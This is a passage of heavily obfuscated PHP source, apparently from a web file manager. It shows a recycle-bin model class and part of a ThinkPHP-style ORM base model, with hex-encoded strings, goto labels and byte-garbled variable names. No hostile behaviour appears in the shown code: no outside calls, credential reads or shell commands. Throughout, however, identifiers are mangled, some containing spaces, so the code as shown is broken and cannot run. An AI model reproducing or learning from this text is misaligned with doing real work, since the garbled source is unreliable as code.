{ return !1; } $Ø‰Üøô = $Æ³œù¹¬[10] . get_path_ext($û¡Ğø¦³); $Ø‰Üøô = $Ø‰Üøô == $Æ³œù¹¬[10] || $Ñ—’Êœ ? $Æ³œù¹¬[12] : $Ø‰Üøô; for ($ºãì• = 1; $ºãì• <= count($Ğ‡Ï­‘‡) + 1; $ºãì•++) { $š´Öì = substr($û¡Ğø¦³, 0, strlen($û¡Ğø¦³) - strlen($Ø‰Üøô)); $Š’¸şŞ¾ = $š´Öì . "\x28{$ºãì•}\x29{$Ø‰Üøô}"; if (!in_array_not_case($Š’¸şŞ¾, $Ğ‡Ï­‘‡)) { return $Š’¸şŞ¾; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\143\145\137\162\145\x63\x79\143\154\145"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\x72\x74", "\x66\x75\156\x63\164\x69\x6f\x6e")); public function listData($ºÃ• Ú = false) { $Û‘ÏĞÖ† =& $_SERVER[ÓïÕü]; $ºÃ• Ú = $ºÃ• Ú ? $ºÃ• Ú : USER_ID; $ß¥¸÷™ã = $this->where(array($Û‘ÏĞÖ†[1797] => $ºÃ• Ú))->select(); return array_to_keyvalue($ß¥¸÷™ã, $Û‘ÏĞÖ†[12], $Û‘ÏĞÖ†[194]); } public function moveToRecycle($ ¡ö³ó¾) { $Äîİõì’ =& $_SERVER[ÓïÕü]; $Å÷İÌ®İ = Model($Äîİõì’[1456]); $·áòÔ´è = $Å÷İÌ®İ->sourceInfo($ ¡ö³ó¾); if (!$·áòÔ´è || $·áòÔ´è[$Äîİõì’[508]] == $Äîİõì’[91]) { return; } $ºÄ´Öµ = array($Äîİõì’[494] => $ ¡ö³ó¾, $Äîİõì’[1797] => USER_ID, $Äîİõì’[656] => $·áòÔ´è[$Äîİõì’[191]], $Äîİõì’[657] => $·áòÔ´è[$Äîİõì’[574]], $Äîİõì’[660] => $·áòÔ´è[$Äîİõì’[589]]); $this->add($ºÄ´Öµ); $this->recycleMove($ ¡ö³ó¾, 1); if ($·áòÔ´è[$Äîİõì’[488]] == $Äîİõì’[91]) { $òğı®øÉ = array($Äîİõì’[660] => array($Äîİõì’[620], $·áòÔ´è[$Äîİõì’[589]] . $ ¡ö³ó¾ . $Äîİõì’[621])); $Å÷İÌ®İ->where($òğı®øÉ)->setField($Äîİõì’[508], 1); } } public function clear() { $this->remove(!1); } public function remove($€îßıŒ = false, $ê´¾£“ = false) { $·¶îëÄ™ =& $_SERVER[ÓïÕü]; $ê´¾£“ = $ê´¾£“ ? $ê´¾£“ : USER_ID; $’†¦ÏÑé = Model($·¶îëÄ™[1456]); $×ÖÇÈ×Â = $this->listData($ê´¾£“); $€îßıŒ = $€îßıŒ === !1 ? !1 : $€îßıŒ; $íÍŒûôä = array(); foreach ($×ÖÇÈ×Â as $æ³Ş‡„û) { if ($€îßıŒ != !1 && !in_array($æ³Ş‡„û, $€îßıŒ)) { continue; } $±¥Ó£±ª = $’†¦ÏÑé->sourceInfo($æ³Ş‡„û); $’†¦ÏÑé->remove($æ³Ş‡„û, !1); $±Ÿ‚Ö¥ = $±¥Ó£±ª[$·¶îëÄ™[191]] . $·¶îëÄ™[11] . $±¥Ó£±ª[$·¶îëÄ™[574]]; $íÍŒûôä[$±Ÿ‚Ö¥] = array($·¶îëÄ™[656] => $±¥Ó£±ª[$·¶îëÄ™[191]], $·¶îëÄ™[574] => $±¥Ó£±ª[$·¶îëÄ™[574]]); $this->where(array($·¶îëÄ™[194] => $æ³Ş‡„û))->delete(); } foreach ($íÍŒûôä as $éÛùªÀ’) { $’†¦ÏÑé->targetSpaceUpdate($éÛùªÀ’[$·¶îëÄ™[191]], $éÛùªÀ’[$·¶îëÄ™[574]]); } } public function restore($œìğÏÏÃ = false) { $¢×©¯îÃ = $this->listData(); $this->_restoreSource($¢×©¯îÃ, $œìğÏÏÃ); } public function removeUserAll($œ·É”Î) { $this->remove(!1, $œ·É”Î); } public function restoreItem($ÁìÅÏß’) { $this->_restoreSource(array($ÁìÅÏß’), array($ÁìÅÏß’)); } private function _restoreSource($ÉîœğŞ¢, $«‚Ï°©‘) { $¸ÊàŒ€Š =& $_SERVER[ÓïÕü]; $ºæ‡ÜÜ¢ = Model($¸ÊàŒ€Š[1456]); $«‚Ï°©‘ = $«‚Ï°©‘ == !1 ? !1 : $«‚Ï°©‘; if (!$ÉîœğŞ¢) { return !0; } $™ÀÕ„Š = array(); foreach ($ÉîœğŞ¢ as $¤ç²ªÅÇ) { if ($«‚Ï°©‘ != !1 && !in_array($¤ç²ªÅÇ, $«‚Ï°©‘)) { continue; } $½üõÈ†Í = $ºæ‡ÜÜ¢->sourceInfo($¤ç²ªÅÇ); $ÉÜŸÁ¸à = $ºæ‡ÜÜ¢->sourceInfo($½üõÈ†Í[$¸ÊàŒ€Š[193]]); if ($ÉÜŸÁ¸à[$¸ÊàŒ€Š[508]] == $¸ÊàŒ€Š[91]) { continue; } $ºæ‡ÜÜ¢->lockMoveStart($¤ç²ªÅÇ); $this->recycleMove($¤ç²ªÅÇ, 0); if ($½üõÈ†Í[$¸ÊàŒ€Š[488]] == $¸ÊàŒ€Š[91]) { $Š…Š¡æ² = array($¸ÊàŒ€Š[660] => array($¸ÊàŒ€Š[620], $½üõÈ†Í[$¸ÊàŒ€Š[589]] . $¤ç²ªÅÇ . $¸ÊàŒ€Š[621])); $ºæ‡ÜÜ¢->where($Š…Š¡æ²)->setField($¸ÊàŒ€Š[508], 0); $this->restoreFolderChildren($¤ç²ªÅÇ, $ÉîœğŞ¢); } $this->where(array($¸ÊàŒ€Š[194] => $¤ç²ªÅÇ))->delete(); $ºæ‡ÜÜ¢->folderSizeReset($½üõÈ†Í[$¸ÊàŒ€Š[193]]); $™ÀÕ„Š[] = $½üõÈ†Í[$¸ÊàŒ€Š[193]]; if ($½üõÈ†Í[$¸ÊàŒ€Š[488]] == $¸ÊàŒ€Š[91]) { $™ÀÕ„Š[] = $¤ç²ªÅÇ; } $ºæ‡ÜÜ¢->lockMoveEnd($¤ç²ªÅÇ); } $ºæ‡ÜÜ¢->updateModifyTime($™ÀÕ„Š); } private function restoreFolderChildren($’ä¥Éô¨, $ÜÓªÃÔ®) { $¨¨Ê¾İà =& $_SERVER[ÓïÕü]; $¢ãëğëÈ = Model($¨¨Ê¾İà[1456]); $½ƒÇ™ıÓ = array($¨¨Ê¾İà[194] => array($¨¨Ê¾İà[7], array())); foreach ($ÜÓªÃÔ® as $©Ï‘Æä×) { if ($©Ï‘Æä× == $’ä¥Éô¨) { continue; } if (!$¢ãëğëÈ->isParentOf($’ä¥Éô¨, $©Ï‘Æä×)) { continue; } $Á”ÆÇ×Ÿ = $¢ãëğëÈ->sourceInfo($©Ï‘Æä×); if ($Á”ÆÇ×Ÿ[$¨¨Ê¾İà[488]] == $¨¨Ê¾İà[91]) { $½ƒÇ™ıÓ[] = array($¨¨Ê¾İà[660] => array($¨¨Ê¾İà[620], $Á”ÆÇ×Ÿ[$¨¨Ê¾İà[589]] . $©Ï‘Æä× . $¨¨Ê¾İà[621])); } else { $½ƒÇ™ıÓ[$¨¨Ê¾İà[194]][1][] = $©Ï‘Æä×; } } if (!$½ƒÇ™ıÓ[$¨¨Ê¾İà[194]][1]) { unset($½ƒÇ™ıÓ[$¨¨Ê¾İà[194]]); } if (!$½ƒÇ™ıÓ) { return; } if (is_array($½ƒÇ™ıÓ[$¨¨Ê¾İà[194]]) && is_array($½ƒÇ™ıÓ[$¨¨Ê¾İà[194]][1])) { $½ƒÇ™ıÓ[$¨¨Ê¾İà[194]][1] = array_unique($½ƒÇ™ıÓ[$¨¨Ê¾İà[194]][1]); } $½ƒÇ™ıÓ[$¨¨Ê¾İà[1104]] = $¨¨Ê¾İà[2109]; $¢ãëğëÈ->where($½ƒÇ™ıÓ)->setField($¨¨Ê¾İà[508], 1); } private function recycleMove($¿åã¤–±, $©©¢Õ™ = 1) { $ğ µ¡Æ² =& $_SERVER[ÓïÕü]; $ö¤ß£ÀÚ = Model($ğ µ¡Æ²[1456]); $òììŒ¾• = Model($ğ µ¡Æ²[2338]); $ßÙÈõ¾Ÿ = array($ğ µ¡Æ²[194] => $¿åã¤–±); if ($©©¢Õ™) { $ö¤ß£ÀÚ->where($ßÙÈõ¾Ÿ)->setField($ğ µ¡Æ²[508], 1); $òììŒ¾•->eventRecycle($¿åã¤–±, $ğ µ¡Æ²[2339]); } else { $è¼—­‘ = $ö¤ß£ÀÚ->where($ßÙÈõ¾Ÿ)->find(); $Åˆ†áÉ¡ = $è¼—­‘[$ğ µ¡Æ²[488]] == $ğ µ¡Æ²[91]; $£›˜ğëä = $ö¤ß£ÀÚ->fileNameAuto($è¼—­‘[$ğ µ¡Æ²[193]], $è¼—­‘[$ğ µ¡Æ²[32]], REPEAT_RENAME_FOLDER, $Åˆ†áÉ¡); if ($£›˜ğëä != $è¼—­‘[$ğ µ¡Æ²[32]]) { $ö¤ß£ÀÚ->rename($¿åã¤–±, $£›˜ğëä); } $ö¤ß£ÀÚ->where($ßÙÈõ¾Ÿ)->setField($ğ µ¡Æ²[508], 0); $òììŒ¾•->eventRecycle($¿åã¤–±, $ğ µ¡Æ²[2340]); } } } goto BÂªØóŞó; bÜ¢–Õ¨éÔ: define($_SERVER[ÓïÕü][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\145", "\x6f\162\144\x65\162", "\x61\x6c\x69\x61\163", "\x68\141\x76\151\156\147", "\147\162\157\165\160", "\x6c\x6f\143\153", "\x64\x69\163\x74\151\x6e\x63\164", "\141\165\x74\157", "\x66\151\154\x74\x65\162", "\x76\141\x6c\x69\144\x61\x74\x65", "\x72\x65\163\165\154\164", "\x62\151\156\x64", "\164\x6f\153\145\156"); public function __construct($··ğÄê« = '', $—ÓöÇÖŞ = '', $áäÕĞÄ‹ = '') { $ÎÑô µÊ =& $_SERVER[ÓïÕü]; $this->_initialize(); if (!empty($··ğÄê«)) { if (strpos($··ğÄê«, $ÎÑô µÊ[10])) { list($this->dbName, $this->name) = explode($ÎÑô µÊ[10], $··ğÄê«); } else { $this->name = $··ğÄê«; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($—ÓöÇÖŞ)) { $this->tablePrefix = $ÎÑô µÊ[12]; } elseif ($ÎÑô µÊ[12] != $—ÓöÇÖŞ) { $this->tablePrefix = $—ÓöÇÖŞ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÎÑô µÊ[324]); } $this->db(0, empty($this->connection) ? $áäÕĞÄ‹ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Øı”°ìİ =& $_SERVER[ÓïÕü]; if (empty($this->fields)) { if (think_config($Øı”°ìİ[325])) { $Å¨«‹î· = $this->dbName ? $this->dbName : think_config($Øı”°ìİ[326]); $¥Ö¶ó¦Ø = think_var_cache($Øı”°ìİ[327] . strtolower(get_path_this($Å¨«‹î·) . $Øı”°ìİ[10] . $this->name)); if ($¥Ö¶ó¦Ø) { $ëú—è˜ = think_config($Øı”°ìİ[328]); if (empty($ëú—è˜) || $¥Ö¶ó¦Ø[$Øı”°ìİ[329]] == $ëú—è˜) { $this->fields = $¥Ö¶ó¦Ø; return; } } } $this->flush(); } } public function flush() { $ÜşË•üŒ =& $_SERVER[ÓïÕü]; $this->db->setModel($this->name); $ıï¤Ğä = $this->db->getFields($this->getTableName()); if (!$ıï¤Ğä) { return !1; } $this->fields = array_keys($ıï¤Ğä); $this->fields[$ÜşË•üŒ[330]] = !1; foreach ($ıï¤Ğä as $¯®Å“” => $¥À¦™„) { $ßì±ô¾[$¯®Å“”] = $¥À¦™„[$ÜşË•üŒ[33]]; if ($¥À¦™„[$ÜşË•üŒ[39]]) { $this->fields[$ÜşË•üŒ[331]] = $¯®Å“”; if ($¥À¦™„[$ÜşË•üŒ[42]]) { $this->fields[$ÜşË•üŒ[330]] = !0; } } } $this->fields[$ÜşË•üŒ[332]] = $ßì±ô¾; if (think_config($ÜşË•üŒ[328])) { $this->fields[$ÜşË•üŒ[329]] = think_config($ÜşË•üŒ[328]); } if (think_config($ÜşË•üŒ[325])) { $«ü­£û = $this->dbName ? $this->dbName : think_config($ÜşË•üŒ[326]); think_var_cache($ÜşË•üŒ[327] . strtolower(get_path_this($«ü­£û) . $ÜşË•üŒ[10] . $this->name), $this->fields); } } public function switchModel($ºéàŸËÖ, $Ì‚ñ½¤ = array()) { $¬ë¨¶Ìš =& $_SERVER[ÓïÕü]; $Ş¨›Âü = ucwords(strtolower($ºéàŸËÖ)) . $¬ë¨¶Ìš[333]; if (!class_exists($Ş¨›Âü)) { think_exception($Ş¨›Âü . think_lang($¬ë¨¶Ìš[334])); } $this->_extModel = new $Ş¨›Âü($this->name); if (!empty($Ì‚ñ½¤)) { foreach ($Ì‚ñ½¤ as $ÓËê×òŒ) { $this->_extModel->setProperty($ÓËê×òŒ, $this->{$ÓËê×òŒ}); } } return $this->_extModel; } public function __set($üÄÊÃÎó, $ŞæÅ™®) { $this->data[$üÄÊÃÎó] = $ŞæÅ™®; } public function __get($•ƒ¡°´â) { return isset($this->data[$•ƒ¡°´â]) ? $this->data[$•ƒ¡°´â] : null; } public function __isset($úèÙ») { return isset($this->data[$úèÙ»]); } public function __unset($ŒëÚ§î¤) { unset($this->data[$ŒëÚ§î¤]); } public function __call($ ¤ığ¶, $²¾ĞùŞ³) { $´àáê î =& $_SERVER[ÓïÕü]; if (in_array(strtolower($ ¤ığ¶), $this->methods, !0)) { $this->options[strtolower($ ¤ığ¶)] = $²¾ĞùŞ³[0]; return $this; } elseif (in_array(strtolower($ ¤ığ¶), array($´àáê î[335], $´àáê î[336], $´àáê î[337], $´àáê î[338], $´àáê î[339]), !0)) { $É“„˜å´ = isset($²¾ĞùŞ³[0]) ? $²¾ĞùŞ³[0] : $´àáê î[223]; $É“„˜å´ = $this->db->parseKey($É“„˜å´); return $this->getField(strtoupper($ ¤ığ¶) . $´àáê î[340] . $É“„˜å´ . $´àáê î[341] . $ ¤ığ¶, $´àáê î[335]); } elseif (strtolower(substr($ ¤ığ¶, 0, 5)) == $´àáê î[342]) { $É“„˜å´ = think_parse_name(substr($ ¤ığ¶, 5)); $±ï‚Û´[$É“„˜å´] = $²¾ĞùŞ³[0]; return $this->where($±ï‚Û´)->find(); } elseif (strtolower(substr($ ¤ığ¶, 0, 10)) == $´àáê î[343]) { $ğóóƒ»Ú = think_parse_name(substr($ ¤ığ¶, 10)); $±ï‚Û´[$ğóóƒ»Ú] = $²¾ĞùŞ³[0]; return $this->where($±ï‚Û´)->getField($²¾ĞùŞ³[1]); } elseif (isset($this->_scope[$ ¤ığ¶])) { return $this->scope($ ¤ığ¶, $²¾ĞùŞ³[0]); } elseif (method_exists($this, $ ¤ığ¶)) { array_unshift($²¾ĞùŞ³, $ ¤ığ¶); return call_user_func_array(array($this, $´àáê î[344]), $²¾ĞùŞ³); } else { return call_user_func_array(array(parent, $ ¤ığ¶), $²¾ĞùŞ³); } } protected function call() { $¦…Ô¶ƒ× =& $_SERVER[ÓïÕü]; $¶¾ÖÚÎ = func_get_args(); $ŞĞ¹´û = array_shift($¶¾ÖÚÎ); $… ¸ŠÛİ = $ŞĞ¹´û; if (is_array($ŞĞ¹´û)) { $… ¸ŠÛİ = $ŞĞ¹´û[1]; $ŞĞ¹´û = $ŞĞ¹´û[0]; } $¶ËÙßÃ® = count($¶¾ÖÚÎ) - 1; if (isset($¶¾ÖÚÎ[$¶ËÙßÃ®]) && $¶¾ÖÚÎ[$¶ËÙßÃ®] === $ŞĞ¹´û) { think_exception(__CLASS__ . $¦…Ô¶ƒ×[4] . $ŞĞ¹´û . think_lang($¦…Ô¶ƒ×[345])); return; } $¶¾ÖÚÎ[] = $ŞĞ¹´û; if (method_exists($this, $¦…Ô¶ƒ×[346])) { $¼»ÓÁˆ— = call_user_func_array(array($this, $¦…Ô¶ƒ×[347]), array($… ¸ŠÛİ, $¶¾ÖÚÎ)); if (!is_null($¼»ÓÁˆ—) && $¼»ÓÁˆ— !== !1) { return $¼»ÓÁˆ—; } } $æó†‘“ = call_user_func_array(array($this, $ŞĞ¹´û), $¶¾ÖÚÎ); if (method_exists($this, $¦…Ô¶ƒ×[348])) { $¼»ÓÁˆ— = call_user_func_array(array($this, $¦…Ô¶ƒ×[349]), array($… ¸ŠÛİ, $¶¾ÖÚÎ, $æó†‘“)); if ($¼»ÓÁˆ—) { return $¼»ÓÁˆ—; } } return $æó†‘“; } protected function _initialize() { } protected function _facade($šÑğù»ö) { $Ï³ŸÒıè =& $_SERVER[ÓïÕü]; if (!empty($this->fields)) { foreach ($šÑğù»ö as $ª¬ç¦Âê => $§ÖÎÕÜ) { if (is_array($this->fields) && !in_array($ª¬ç¦Âê, $this->fields, !0)) { unset($šÑğù»ö[$ª¬ç¦Âê]); } elseif (is_scalar($§ÖÎÕÜ)) { $this->_parseType($šÑğù»ö, $ª¬ç¦Âê); } } } if (!empty($this->options[$Ï³ŸÒıè[350]])) { $šÑğù»ö = array_map($this->options[$Ï³ŸÒıè[350]], $šÑğù»ö); unset($this->options[$Ï³ŸÒıè[350]]); } $this->_beforeWrite($šÑğù»ö); return $šÑğù»ö; } protected function _beforeWrite(&$À—¾ õÈ) { } public function add($òµ†ı¶ = '', $ÃûŞ¹ˆÃ = array(), $¡«÷Ğòì = false) { if (empty($òµ†ı¶)) { if (!empty($this->data)) { $òµ†ı¶ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÓïÕü][351]); return !1; } } $ÃûŞ¹ˆÃ = $this->_parseOptions($ÃûŞ¹ˆÃ); $òµ†ı¶ = $this->_facade($òµ†ı¶); if (!1 === $this->_beforeInsert($òµ†ı¶, $ÃûŞ¹ˆÃ)) { return !1; } $³ğµâ½à = $this->db->insert($òµ†ı¶, $ÃûŞ¹ˆÃ, $¡«÷Ğòì); if (!1 !== $³ğµâ½à) { $°¿§¦Å = $this->getLastInsID(); if ($°¿§¦Å) { $òµ†ı¶[$this->getPk()] = $°¿§¦Å; $this->_after_insert($òµ†ı¶, $ÃûŞ¹ˆÃ); return $°¿§¦Å; } $this->_after_insert($òµ†ı¶, $ÃûŞ¹ˆÃ); } return $³ğµâ½à; } protected function _beforeInsert(&$™§ó–Ÿ¨, $Û±Şñ„Â) { } protected function _after_insert($ß¿—ôˆ, $šíÍûã) { } public function addAll($áÂ®‘Î¿, $—­œ…³» = array(), $ìÍÄòÓ¢ = false) { $è«€Êú =& $_SERVER[ÓïÕü]; if (empty($áÂ®‘Î¿)) { $this->error = think_lang($è«€Êú[351]); return !1; } $—­œ…³» = $this->_parseOptions($—­œ…³»); foreach ($áÂ®‘Î¿ as $¾‚íè‰‹ => $âÙ³îÌ¡) { $áÂ®‘Î¿[$¾‚íè‰‹] = $this->_facade($âÙ³îÌ¡); } if (method_exists($this->db, $è«€Êú[352])) { $¯¥à¯ó‘ = $this->db->insertAll($áÂ®‘Î¿, $—­œ…³», $ìÍÄòÓ¢); } else { $this->startTrans(); foreach ($áÂ®‘Î¿ as $¾‚íè‰‹ => $âÙ³îÌ¡) { $¯¥à¯ó‘ = $this->db->insert($âÙ³îÌ¡, $—­œ…³», $ìÍÄòÓ¢); } $this->commit(); } if (!1 !== $¯¥à¯ó‘) { $Ö¿äŸ = $this->getLastInsID(); if ($Ö¿äŸ) { return $Ö¿äŸ; } } return $¯¥à¯ó‘; } public function selectAdd($©úòó¥Ş = '', $Û¬üˆ˜À = '', $œ–ñÙ­Ì = array()) { $¹ˆá±Ïà =& $_SERVER[ÓïÕü]; $œ–ñÙ­Ì = $this->_parseOptions($œ–ñÙ­Ì); if (!1 === ($îÈóòÒ² = $this->db->selectInsert($©úòó¥Ş ? $©úòó¥Ş : $œ–ñÙ­Ì[$¹ˆá±Ïà[353]], $Û¬üˆ˜À ? $Û¬üˆ˜À : $this->getTableName(), $œ–ñÙ­Ì))) { $this->error = think_lang($¹ˆá±Ïà[354]); return !1; } else { return $îÈóòÒ²; } } public function save($¿ø§ÅÓä = '', $ß­ºõøª = array()) { $»•„í›µ =& $_SERVER[ÓïÕü]; if (empty($¿ø§ÅÓä)) { if (!empty($this->data)) { $¿ø§ÅÓä = $this->data; $this->data = array(); } else { $this->error = think_lang($»•„í›µ[351]); return !1; } } $¿ø§ÅÓä = $this->_facade($¿ø§ÅÓä); $ß­ºõøª = $this->_parseOptions($ß­ºõøª); $Æˆ­Œ¥ˆ = $this->getPk(); if (!isset($ß­ºõøª[$»•„í›µ[355]])) { if (isset($¿ø§ÅÓä[$Æˆ­Œ¥ˆ])) { $”éşøÀ¦[$Æˆ­Œ¥ˆ] = $¿ø§ÅÓä[$Æˆ­Œ¥ˆ]; $ß­ºõøª[$»•„í›µ[355]] = $”éşøÀ¦; unset($¿ø§ÅÓä[$Æˆ­Œ¥ˆ]); } else { $this->error = think_lang($»•„í›µ[354]); return !1; } } if (is_array($ß­ºõøª[$»•„í›µ[355]]) && isset($ß­ºõøª[$»•„í›µ[355]][$Æˆ­Œ¥ˆ])) { $âÍ¤­Ç = $ß­ºõøª[$»•„í›µ[355]][$Æˆ­Œ¥ˆ]; } if (!1 === $this->_beforeUpdate($¿ø§ÅÓä, $ß­ºõøª)) { return !1; } $Şã†µ–¤ = $this->db->update($¿ø§ÅÓä, $ß­ºõøª); if (!1 !== $Şã†µ–¤) { if (isset($âÍ¤­Ç)) { $¿ø§ÅÓä[$Æˆ­Œ¥ˆ] = $âÍ¤­Ç; } $this->_afterUpdate($¿ø§ÅÓä, $ß­ºõøª); } return $Şã†µ–¤; } protected function _beforeUpdate(&$¤œ†¹¨½, $îÄ¡Óû) { } protected function _afterUpdate($ ûÖ¸ı, $Óùí…ıç) { } public function delete($ßº®ÓÛí = array()) { $±ïüÍ”‹ =& $_SERVER[ÓïÕü]; if (empty($ßº®ÓÛí) && empty($this->options[$±ïüÍ”‹[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $İè£óš = $this->getPk(); if (is_numeric($ßº®ÓÛí) || is_string($ßº®ÓÛí)) { if (strpos($ßº®ÓÛí, $±ïüÍ”‹[50])) { $‚Ø§ø•‹[$İè£óš] = array($±ïüÍ”‹[356], $ßº®ÓÛí); } else { $‚Ø§ø•‹[$İè£óš] = $ßº®ÓÛí; } $this->options[$±ïüÍ”‹[355]] = $‚Ø§ø•‹; } $ßº®ÓÛí = $this->_parseOptions(); if (is_array($ßº®ÓÛí[$±ïüÍ”‹[355]]) && isset($ßº®ÓÛí[$±ïüÍ”‹[355]][$İè£óš])) { $î‡–†şÇ = $ßº®ÓÛí[$±ïüÍ”‹[355]][$İè£óš]; } $œ„±çî¸ = $this->db->delete($ßº®ÓÛí); if (!1 !== $œ„±çî¸) { $ÕÌ©ïì¿ = array(); if (isset($î‡–†şÇ)) { $ÕÌ©ïì¿[$İè£óš] = $î‡–†şÇ; } $this->_after_delete($ÕÌ©ïì¿, $ßº®ÓÛí); } return $œ„±çî¸; } protected function _after_delete($Èï™°øû, $™‘Ñö) { } public function select($Óì«ôÆ = array()) { $İšªÓŸ“ =& $_SERVER[ÓïÕü]; if (is_string($Óì«ôÆ) || is_numeric($Óì«ôÆ)) { $ïœå« = $this->getPk(); if (strpos($Óì«ôÆ, $İšªÓŸ“[50])) { $í¯Ò¿Ñ[$ïœå«] = array($İšªÓŸ“[356], $Óì«ôÆ); } else { $í¯Ò¿Ñ[$ïœå«] = $Óì«ôÆ; } $this->options[$İšªÓŸ“[355]] = $í¯Ò¿Ñ; } elseif (!1 === $Óì«ôÆ) { $Óì«ôÆ = $this->_parseOptions(); return $İšªÓŸ“[357] . $this->db->buildSelectSql($Óì«ôÆ) . $İšªÓŸ“[358]; } $Óì«ôÆ = $this->_parseOptions(); $€Œ”€–ƒ = $this->db->select($Óì«ôÆ); if (!1 === $€Œ”€–ƒ) { return !1; } if (empty($€Œ”€–ƒ)) { return null; } $this->_afterSelect($€Œ”€–ƒ, $Óì«ôÆ); return $€Œ”€–ƒ; } protected function _afterSelect(&$‘šÄ×‘û, $¢ÇäÍÔ±) { } public function buildSql($šÅªÈ‘‡ = array()) { $™²¥Çë =& $_SERVER[ÓïÕü]; $šÅªÈ‘‡ = $this->_parseOptions($šÅªÈ‘‡); return $™²¥Çë[357] . $this->db->buildSelectSql($šÅªÈ‘‡) . $™²¥Çë[358]; } public function optionsValue($ì‰å©§Ó = null) { if (is_null($ì‰å©§Ó)) { return $this->options; } elseif (is_array($ì‰å©§Ó)) { $this->options = array_merge($this->options, $ì‰å©§Ó); } } protected function _parseOptions($’¥³Ä÷ = array()) { $óÁ‘Ïã” =& $_SERVER[ÓïÕü]; if (is_array($’¥³Ä÷)) { $’¥³Ä÷ = array_merge($this->options, $’¥³Ä÷); } $this->options = array(); if (!isset($’¥³Ä÷[$óÁ‘Ïã”[359]])) { $’¥³Ä÷[$óÁ‘Ïã”[359]] = $this->getTableName(); $ÂöĞ‹€¨ = $this->fields; } else { $ÂöĞ‹€¨ = $this->getDbFields(); } if (!empty($’¥³Ä÷[$óÁ‘Ïã”[360]])) { $’¥³Ä÷[$óÁ‘Ïã”[359]] .= $óÁ‘Ïã”[53] . $’¥³Ä÷[$óÁ‘Ïã”[360]]; } $’¥³Ä÷[$óÁ‘Ïã”[361]] = $this->name; if (isset($’¥³Ä÷[$óÁ‘Ïã”[355]]) && is_array($’¥³Ä÷[$óÁ‘Ïã”[355]]) && !empty($ÂöĞ‹€¨) && !isset($’¥³Ä÷[$óÁ‘Ïã”[362]]) && !isset($’¥³Ä÷[$óÁ‘Ïã”[359]])) { foreach ($’¥³Ä÷[$óÁ‘Ïã”[355]] as $Ë¬ßí => $‰­ÂÅı±) { $Ë¬ßí = trim($Ë¬ßí); if (in_array($Ë¬ßí, $ÂöĞ‹€¨, !0)) { if (is_scalar($‰­ÂÅı±)) { $this->_parseType($’¥³Ä÷[$óÁ‘Ïã”[355]], $Ë¬ßí); } } elseif (!is_numeric($Ë¬ßí) && $óÁ‘Ïã”[11] != substr($Ë¬ßí, 0, 1) && !1 === strpos($Ë¬ßí, $óÁ‘Ïã”[10]) && !1 === strpos($Ë¬ßí, $óÁ‘Ïã”[340]) && !1 === strpos($Ë¬ßí, $óÁ‘Ïã”[215]) && !1 === strpos($Ë¬ßí, $óÁ‘Ïã”[287])) { unset($’¥³Ä÷[$óÁ‘Ïã”[355]][$Ë¬ßí]); } } } $this->_options_filter($’¥³Ä÷); return $’¥³Ä÷; } protected function _options_filter(&$ïåÃ§ğÑ) { } protected function _parseType(&$„ÃÄßÚÍ, $ò»¯…¾‡) { $ÜÏ•¼öõ =& $_SERVER[ÓïÕü]; if (empty($this->options[$ÜÏ•¼öõ[363]][$ÜÏ•¼öõ[4] . $ò»¯…¾‡])) { $—ë“Ç = strtolower($this->fields[$ÜÏ•¼öõ[332]][$ò»¯…¾‡]); if (!1 !== strpos($—ë“Ç, $ÜÏ•¼öõ[364])) { } elseif (!1 === strpos($—ë“Ç, $ÜÏ•¼öõ[365]) && !1 !== strpos($—ë“Ç, $ÜÏ•¼öõ[366])) { $„ÃÄßÚÍ[$ò»¯…¾‡] = intval($„ÃÄßÚÍ[$ò»¯…¾‡]); } elseif (!1 !== strpos($—ë“Ç, $ÜÏ•¼öõ[367]) || !1 !== strpos($—ë“Ç, $ÜÏ•¼öõ[368])) { $„ÃÄßÚÍ[$ò»¯…¾‡] = floatval($„ÃÄßÚÍ[$ò»¯…¾‡]); } elseif (!1 !== strpos($—ë“Ç, $ÜÏ•¼öõ[369])) { $„ÃÄßÚÍ[$ò»¯…¾‡] = (bool) $„ÃÄßÚÍ[$ò»¯…¾‡]; } } } public function find($ôá™£¥Ö = array()) { $ËŠ¥ğºş =& $_SERVER[ÓïÕü]; if (is_numeric($ôá™£¥Ö) || is_string($ôá™£¥Ö)) { $‚Àõ¾§ó[$this->getPk()] = intval($ôá™£¥Ö); $this->options[$ËŠ¥ğºş[355]] = $‚Àõ¾§ó; } $this->options[$ËŠ¥ğºş[370]] = 1; $ôá™£¥Ö = $this->_parseOptions(); $Œø†¸ÖÌ = $this->db->select($ôá™£¥Ö); if (!1 === $Œø†¸ÖÌ) { return !1; } if (empty($Œø†¸ÖÌ)) { return null; } $this->data = $Œø†¸ÖÌ[0]; $this->_afterFind($this->data, $ôá™£¥Ö); if (!empty($this->options[$ËŠ¥ğºş[371]])) { return $this->returnResult($this->data, $this->options[$ËŠ¥ğºş[371]]); } return $this->data; } protected function _afterFind(&$ĞøÄÌóş, $İ¬¶€¥º) { } protected function returnResult($ÁÛÜÌüĞ, $‡ì Š« = '') { $¨’¶¬­÷ =& $_SERVER[ÓïÕü]; if ($‡ì Š«) { if (is_callable($‡ì Š«)) { return call_user_func($‡ì Š«, $ÁÛÜÌüĞ); } switch (strtolower($‡ì Š«)) { case $¨’¶¬­÷[372]: return json_encode($ÁÛÜÌüĞ); case $¨’¶¬­÷[373]: return xml_encode($ÁÛÜÌüĞ); } } return $ÁÛÜÌüĞ; } public function parseFieldsMap($¯ØÏÅïú, $ØØ·â¥û = 1) { if (!empty($this->_map)) { foreach ($this->_map as $˜ÂöÈü² => $¡ŞØ§¼”) { if 